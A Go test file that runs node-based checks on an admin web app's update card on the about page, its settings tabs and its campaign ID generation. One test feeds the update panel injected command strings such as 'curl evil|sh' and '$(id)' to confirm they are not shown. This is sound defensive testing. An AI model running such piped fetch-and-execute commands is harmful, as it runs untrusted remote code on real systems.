  const pending = base(); pending.request_pending = true; pending.can_apply = false; pending.apply_block = 'request_pending';
  answers = {'/api/update': pending, '/api/version': verOK, '/api/system': sysOK};
  await aboutPage();
  yes(BODY.innerHTML.includes('data-step="queued"') && BODY.innerHTML.includes('upd.prog.accepted'), 'a request already in the inbox shows its progress');

  const onTip = base(); onTip.check.ahead = 3; onTip.check.target = {commit: sha, version: 'v0.1.0'};
  onTip.check.commits = [{sha: sha, subject: 'this build', author: 'a'}]; onTip.check.notes = 'note'; onTip.check.manual_steps = [];
  answers = {'/api/update': onTip, '/api/version': verOK, '/api/system': sysOK};
  await aboutPage();
  yes(BODY.innerHTML.includes('upd.target.none') && !BODY.innerHTML.includes('upd.commits') && !BODY.innerHTML.includes('this build'), 'the running commit is not listed as commits ahead');

  const running = base(); running.can_apply = false; running.apply_block = 'running';
  running.state = {id: 'run0run0run0run0', action: 'apply', result: 'running', phase: 'build', phases: [{name: 'env', ok: true}], from: sha, to: cur};
  answers = {'/api/update': running, '/api/version': verOK, '/api/system': sysOK};
  await aboutPage();
  yes(BODY.innerHTML.includes('<div class="upd-prog" id="upd-prog" data-step="running">'), 'a run started elsewhere shows its progress');
  SESS['emtds-upd-track'] = JSON.stringify({id: 'req0req0req0req0', prev: 'run0run0run0run0'});
  running.request_pending = true; running.state = {id: 'run0run0run0run0', result: 'ok', finished_at: 'x', phases: []};
  await aboutPage();
  yes(BODY.innerHTML.includes('data-step="queued"'), 'a followed request waits in the inbox');
  delete SESS['emtds-upd-track'];

  const signing = base(); signing.agent.signing = true;
  answers = {'/api/update': signing, '/api/version': verOK, '/api/system': sysOK};
  await aboutPage();
  yes(BODY.innerHTML.includes('<span class="pill bad">upd.unsigned</span>') && BODY.innerHTML.includes('<span class="pill ok">upd.sign.on</span>'), 'with the policy on, an unsigned target is flagged');
  signing.check.signed = true; signing.check.signer = 'Bob';
  await aboutPage();
  yes(BODY.innerHTML.includes('upd.signed: Bob') && !BODY.innerHTML.includes('upd.unsigned'), 'a signed target shows the signer');

  const same = base(); same.check.ahead = 0; same.check.manual_steps = []; same.check.notes = '';
  answers = {'/api/update': same, '/api/version': verOK, '/api/system': sysOK};
  await aboutPage();
  yes(BODY.innerHTML.includes('upd.target.none') && BODY.innerHTML.includes('checked W(2026-11-17T01:00:00Z) (A(2026-11-17T01:00:00Z))'), 'up to date with the age of the check');

  const hostile = base();
  hostile.cli = [U + ' --check', U + ' --to ' + cur.slice(0, 12) + '; curl evil|sh #', U + ' --to $(id)', U + ' --to abc def', 'curl evil|sh', U + ' --rollback'];
  answers = {'/api/update': hostile, '/api/version': verOK, '/api/system': sysOK};
  await aboutPage();
  yes(!/evil|\$\(|curl|abcdef0 def/.test(BODY.innerHTML), 'a command that is not of the expected shape is not drawn');
  yes(BODY.innerHTML.includes('<code>' + U + ' --check</code>') && BODY.innerHTML.includes('<code>' + U + ' --rollback</code>'), 'the valid commands are still drawn');
  yes(!BODY.innerHTML.includes('--schema-ok'), 'no --schema-ok line without a valid --to command');

  const gitErr = 'fatal: repository \'https://github.com/owner/repo.git/\' not found';
  for (const [state, repo] of [['repo_not_found', 'https://github.com/owner/repo.git'], ['repo_paused', 'https://github.com/hasayone/empataso-tds.git'], ['repo_paused', '']]) {
    const lost = base(); lost.agent.repo = repo; lost.repo_state = state; lost.can_apply = false; lost.apply_block = state;
    lost.check = {at: '2026-11-17T01:00:00Z', ahead: 0, current: {commit: sha}, target: {}, commits: [], error: gitErr};
    answers = {'/api/update': lost, '/api/version': verOK, '/api/system': sysOK};
    await aboutPage();
    const h = BODY.innerHTML;
    yes(h.includes('id="upd-repo-note"') && h.includes('upd.block.' + state), state + ' ' + (repo || 'unset') + ': the calm text');
    yes(!h.includes('fatal') && !h.includes('not found') && !h.includes('upd.target.error') && !h.includes('upd.target.none'), state + ': no git error and no "latest version"');
    yes(h.includes('<code>sudo /usr/local/lib/emtds/update.sh --install --repo &lt;URL&gt;</code>'), state + ': the command that sets another repository');
    yes(repo ? h.includes('<td>' + repo + '</td>') : h.includes('upd.repo.unset'), state + ': the address row stays');
    yes(/id="upd-apply-btn"[^>]* disabled/.test(h) && !h.includes('id="upd-apply-why"'), state + ': the update button is blocked without a second reason line');
    yes(h.includes('id="upd-check-btn"'), state + ': a new check may be asked for');
  }

  const dev = base(); dev.build = {version: 'dev', commit: ''}; dev.agent.repo = 'ftp://x';
  answers = {'/api/update': dev, '/api/version': {admin: dev.build}, '/api/system': sysOK};
  await aboutPage();
  yes(!BODY.innerHTML.includes('CHANGELOG.md') && !BODY.innerHTML.includes('about.stale'), 'a dev build has no changelog link and no stale warning');
  if (failed) { console.log(failed + ' check(s) failed'); process.exit(1); }
})();
`

// TestSettingsTabsAndAbout runs the settings tabs, the user menu, the about page and the first-run token field under node.
// The helpers and the pages are cut out of the SPA by name and run against small stubs of the page, the session and the API.
// It skips when node is absent and fails with the node output when a check does not hold.
func TestSettingsTabsAndAbout(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the settings and about checks")
	}
	html := spaSource()
	var b strings.Builder
	b.WriteString("let ME=null, UPD_GEN=0, UPD_VER=null, BOARDS={loaded:false}, SYSNOTE_AT=0;\n")
	b.WriteString("const sysNotice=()=>{}, SESS={};\n")
	b.WriteString("var sessionStorage={getItem:k=>k in SESS?SESS[k]:null, setItem:(k,v)=>{SESS[k]=String(v)}, removeItem:k=>{delete SESS[k]}};\n")
	b.WriteString("const PAGE_SECTION={};\n")
	b.WriteString("const SIG={data:{update:false, down:[]}};\n")
	b.WriteString("const dict={'about.free':'{free} free of {total}','about.ms':'{n} ms','about.hb':'hb {age}','about.state.ok':'OK','about.state.down':'Down','about.state.not_configured':'Not configured','about.stale':'stale {commit}','upd.target.checked':'checked {at}','land.unit.b':'B','land.unit.kb':'KB','land.unit.mb':'MB','land.unit.gb':'GB'};\n")
	b.WriteString("const tr=k=>(k in dict)?dict[k]:k;\n")
	b.WriteString("var uiLocale=()=>'en', when=s=>'W('+s+')', ago=s=>'A('+s+')', view, history, go, settings, boardsPage, usersPage, apiKeys, q, qa, get;\n")
	b.WriteString("const userTypeLabel=()=>'Admin', openPostbacks=()=>{}, logout=()=>{}, boardSwitchRows=()=>[], postbackDocs=()=>{}, apiDocs=async()=>{};\n")
	b.WriteString("const icon=()=>'<svg class=\"ic\" viewBox=\"0 0 24 24\"></svg>';\n")
	b.WriteString("var location={hash:''};\n")
	b.WriteString("q=()=>null; qa=()=>[]; get=async()=>null;\n")
	if line := spaConstLine(html, "const esc="); line != "" {
		b.WriteString(line + "\n")
	} else {
		t.Fatal("esc not found in SPA")
	}
	if tabs := spaBetween(html, "const SETTINGS_TABS=[", "\n];"); tabs != "" {
		b.WriteString(tabs + "\n];\n")
	} else {
		t.Fatal("SETTINGS_TABS not found in SPA")
	}
	for _, prefix := range []string{"const UPD_REPO_RE=", "const UPD_CLI_RE=", "const UPD_TRACK_KEY="} {
		line := spaConstLine(html, prefix)
		if line == "" {
			t.Fatalf("%s not found in SPA", prefix)
		}
		b.WriteString(line + "\n")
	}
	for _, name := range []string{"trFill", "byteSize", "accessPages", "sectionAllowed", "pageAllowed", "meIsAdmin", "settingsTabs", "settingsTabsAllowed", "adminMenuEntries", "userMenuItems",
		"appendBoardUserMenuItems", "boardChromeVisible", "changelogURL", "updSignBadge", "safeCLI", "schemaOkCommand", "durationText", "systemRowsHTML",
		"buildLabelHTML", "setupTokenFieldHTML", "setupMessage", "sigMark", "sigNames", "sigMenuMark",
		"updTrackGet", "updTrackSet", "updProgress", "updProgressHTML", "updCardHTML"} {
		fn := spaTopFunction(html, name, false)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		b.WriteString(fn + "\n")
	}
	for _, name := range []string{"profile", "aboutPage"} {
		fn := spaTopFunction(html, name, true)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		b.WriteString(fn + "\n")
	}
	b.WriteString(settingsAboutChecks)
	f := filepath.Join(t.TempDir(), "settings-about.js")
	if err := os.WriteFile(f, []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("settings and about checks failed:\n%s", out)
	}
}

// TestDuplicateCampaignId runs a campaign copy under node.
// The copy's id is 9 characters from CAMPAIGN_ID_ALPHABET, never the source id with a _copy suffix.
// Two copies get different ids. An id or alias already used, including one that is only in the loaded
// list and one from another section, is not issued; a clash draws another id of the same length.
// It skips when node is absent and fails with the node output when a check does not hold.
func TestDuplicateCampaignId(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the campaign copy id checks")
	}
	html := spaSource()
	body := spaFunctionLine(html, "duplicateFlow")
	if body == "" {
		t.Fatal("duplicateFlow not found in SPA")
	}
	if strings.Contains(body, "_copy") || strings.Contains(body, "uniqueName") {
		t.Fatal("duplicateFlow still builds the id from the source id")
	}
	for _, part := range []string{"freshCampaignId", "ensureNums(true)", "c.board_id=boardEffectiveId()", "c.name+=' (copy)'"} {
		if !strings.Contains(body, part) {
			t.Errorf("duplicateFlow missing %s", part)
		}
	}
	if strings.Contains(body, "ORDER_DIRTY") {
		t.Fatal("a copy must not force a whole-list save")
	}
	ids := spaFunctionLine(html, "takenCampaignIds")
	if strings.Contains(ids, "campaignRows") || strings.Contains(ids, "FLOW_PAGE") {
		t.Fatal("taken ids must come from the loaded campaigns, not the page on screen")
	}
	alpha := spaConstLine(html, "const CAMPAIGN_ID_ALPHABET=")
	q1 := strings.Index(alpha, "'")
	q2 := strings.LastIndex(alpha, "'")
	if alpha == "" || q1 < 0 || q2 <= q1 {
		t.Fatal("CAMPAIGN_ID_ALPHABET not found")
	}
	chars := alpha[q1+1 : q2]
	if len(chars) < 30 {
		t.Fatalf("alphabet too short: %s", chars)
	}
	for _, ch := range "0O1lI" {
		if strings.ContainsRune(chars, ch) {
			t.Errorf("alphabet contains %q", ch)
		}
	}
	var src strings.Builder
	for _, prefix := range []string{
		"const CAMPAIGN_ID_ALPHABET=",
		"const CAMPAIGN_ID_LEN=",
		"let CAMPAIGN_ID_BOARDS=",
		"let CAMPAIGN_ID_BOARD=",
	} {
		line := spaConstLine(html, prefix)
		if line == "" {
			t.Fatalf("%s not found", prefix)
		}
		src.WriteString(line + "\n")
	}
	for _, name := range []string{"randomCampaignId", "freshCampaignId", "addCampaignIds", "boardWideOn", "takenCampaignIds", "duplicateFlow"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found", name)
		}
		if strings.Contains(html, "async function "+name+"(") {
			fn = "async " + fn
		}
		src.WriteString(fn + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => {
  const g = JSON.stringify(got), w = JSON.stringify(want);
  if (g !== w) { failed++; console.log('FAIL ' + what + '\n  got  ' + g + '\n  want ' + w); }
};
let plan = [];
const realRandom = randomCampaignId;
randomCampaignId = () => {
  if (!plan.length) throw new Error('empty plan');
  return plan.shift();
};
let GROUPS = [
  {id:'promo', name:'Promo', aliases:['old-alias'], num:1, streams:[]},
  {id:'other', name:'Other', aliases:['ZZZZZZZZZ'], num:2, streams:[]},
  {id:'offpage', name:'Hidden', aliases:['pagealias'], num:3, streams:[]}
];
let BOARDS = {items:[{id:'main', include_all:true}]};
let fetched = 0;
let fetchImpl = async () => [];
async function fetchGroupRows(opts){ return fetchImpl(opts); }
function boardNormId(id){ const s=id==null?'':String(id).trim(); return s==='main'?'':s; }
function boardEffectiveId(){ return ''; }
function ensureNums(){}
function nextNum(){ return 99; }
function markDirty(){}
function clone(o){ return JSON.parse(JSON.stringify(o)); }
const gone = [];
function go(p){ gone.push(p); }
(async () => {
  const abc = CAMPAIGN_ID_ALPHABET;
  const seen = new Set();
  for (let i = 0; i < 40; i++) {
    const id = realRandom();
    seen.add(id);
    eq(id.length, 9, 'real id length');
    eq([...id].every(ch => abc.includes(ch)), true, 'real id alphabet ' + id);
    eq(id.includes('_'), false, 'real id has no underscore');
  }
  eq(seen.size > 1, true, 'two real ids differ');

  plan = ['promo', 'old-alias', 'offpage', 'pagealias', 'ZZZZZZZZZ', 'abcdefghj'];
  const src = GROUPS[0];
  const a = await duplicateFlow(src, true);
  eq(a.id, 'abcdefghj', 'a taken id or alias is not issued');
  eq(a.id.length, 9, 'copy length');
  eq(a.id.includes('_copy'), false, 'copy has no _copy');
  eq(a.name, 'Promo (copy)', 'the name still says it is a copy');
  eq(a.aliases, [], 'the copy keeps no aliases');
  eq(gone, [], 'stay does not open the copy');
  eq(fetched, 0, 'the wide main list is not fetched again');

  plan = ['abcdefghj', 'mnopqrstu'];
  const b = await duplicateFlow(src, true);
  eq(b.id, 'mnopqrstu', 'the second copy skips the first copy id');
  eq(a.id === b.id, false, 'two copies do not share an id');

  BOARDS = {items:[{id:'main', include_all:false}, {id:'sec'}]};
  fetchImpl = async (opts) => {
    fetched++;
    eq(opts.board, 'sec', 'the other section is read');
    return [{id:'sectaken', aliases:['aliassect']}];
  };
  plan = ['sectaken', 'aliassect', 'bcdefghjk'];
  const c = await duplicateFlow(src, true);
  eq(c.id, 'bcdefghjk', 'an id from another section is not issued');
  eq(fetched, 1, 'the other section is read once');
  plan = ['bcdefghjk', 'cdefghjkm'];
  const d = await duplicateFlow(src, true);
  eq(d.id, 'cdefghjkm', 'the second copy still skips that section');
  eq(fetched, 1, 'the other section is not read again');
  if (failed) process.exit(1);
})().catch(e => { console.log('FAIL ' + (e && e.stack || e)); process.exit(1); });
`)
	f := filepath.Join(t.TempDir(), "dup-id.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("campaign copy id checks failed:\n%s", out)
	}
}

// TestNewCampaignId runs a new campaign and a copy under node.
// Each id is 9 characters from CAMPAIGN_ID_ALPHABET, never flow_0000 or flow_0001.
// Two creates differ, and two copies differ. A folder passed to newFlow is stored.
// It skips when node is absent and fails with the node output when a check does not hold.
func TestNewCampaignId(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the new campaign id checks")
	}
	html := spaSource()
	body := spaFunctionLine(html, "newFlow")
	if body == "" {
		t.Fatal("newFlow not found in SPA")
	}
	if strings.Contains(body, "'flow'+") || strings.Contains(body, "flows/flow") {
		t.Fatal("newFlow still builds a sequential id")
	}
	if !strings.Contains(body, "freshCampaignId") {
		t.Fatal("newFlow does not use freshCampaignId")
	}
	var src strings.Builder
	for _, prefix := range []string{
		"const DEFAULT_ANSWER=",
		"const DEFAULT_UNIQ_BY=",
		"const CAMPAIGN_ID_ALPHABET=",
		"const CAMPAIGN_ID_LEN=",
		"let CAMPAIGN_ID_BOARDS=",
		"let CAMPAIGN_ID_BOARD=",
	} {
		line := spaConstLine(html, prefix)
		if line == "" {
			t.Fatalf("%s not found", prefix)
		}
		src.WriteString(line + "\n")
	}
	for _, name := range []string{"randomCampaignId", "freshCampaignId", "addCampaignIds", "boardWideOn", "takenCampaignIds", "newFlow", "duplicateFlow"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found", name)
		}
		if strings.Contains(html, "async function "+name+"(") {
			fn = "async " + fn
		}
		src.WriteString(fn + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => {
  const g = JSON.stringify(got), w = JSON.stringify(want);
  if (g !== w) { failed++; console.log('FAIL ' + what + '\n  got  ' + g + '\n  want ' + w); }
};
let GROUPS = [];
let BOARDS = {items:[{id:'main', include_all:true}]};
function boardNormId(id){ const s=id==null?'':String(id).trim(); return s==='main'?'':s; }
function boardEffectiveId(){ return ''; }
function ensureNums(){}
function nextNum(){ return 7; }
function defaultGeo(){ return 'db'; }
function markDirty(){}
function clone(o){ return JSON.parse(JSON.stringify(o)); }
const gone = [];
function go(p){ gone.push(p); }
const slug = id => typeof id === 'string' && id.length === CAMPAIGN_ID_LEN && [...id].every(ch => CAMPAIGN_ID_ALPHABET.includes(ch)) && !/^flow_?\d+$/.test(id);
(async () => {
  await newFlow();
  await newFlow('Offers');
  eq(GROUPS.length, 2, 'two new campaigns');
  eq(slug(GROUPS[0].id), true, 'first id ' + GROUPS[0].id);
  eq(slug(GROUPS[1].id), true, 'second id ' + GROUPS[1].id);
  eq(GROUPS[0].id === GROUPS[1].id, false, 'two creates differ');
  eq(GROUPS[0].id === 'flow_0000' || GROUPS[1].id === 'flow_0000', false, 'neither create is flow_0000');
  eq(GROUPS[1].folder, 'Offers', 'the folder is stored');
  eq(gone[0], 'flows/' + encodeURIComponent(GROUPS[0].id), 'the route is the slug');
  const src = GROUPS[0];
  const a = await duplicateFlow(src, true);
  const b = await duplicateFlow(src, true);
  eq(slug(a.id), true, 'first copy ' + a.id);
  eq(slug(b.id), true, 'second copy ' + b.id);
  eq(a.id === b.id, false, 'two copies differ');
  eq(a.id === src.id || b.id === src.id, false, 'a copy is not the source');
  eq(a.id === 'flow_0000' || b.id === 'flow_0001', false, 'a copy is not a sequential stub');
  if (failed) process.exit(1);
})().catch(e => { console.log('FAIL ' + (e && e.stack || e)); process.exit(1); });
`)
	f := filepath.Join(t.TempDir(), "new-id.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("new campaign id checks failed:\n%s", out)
	}
}
